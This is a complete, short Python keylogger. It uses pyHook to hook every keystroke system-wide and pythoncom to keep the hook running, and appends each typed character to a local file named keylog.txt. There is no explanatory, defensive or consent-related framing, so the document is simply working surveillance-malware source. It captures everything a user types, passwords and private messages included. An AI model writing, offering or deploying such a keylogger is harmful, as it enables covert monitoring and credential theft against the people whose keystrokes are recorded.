import pythoncom
import pyHook

def OnKeyboardEvent(event):
    with open("keylog.txt", "a") as f:
        f.write(chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
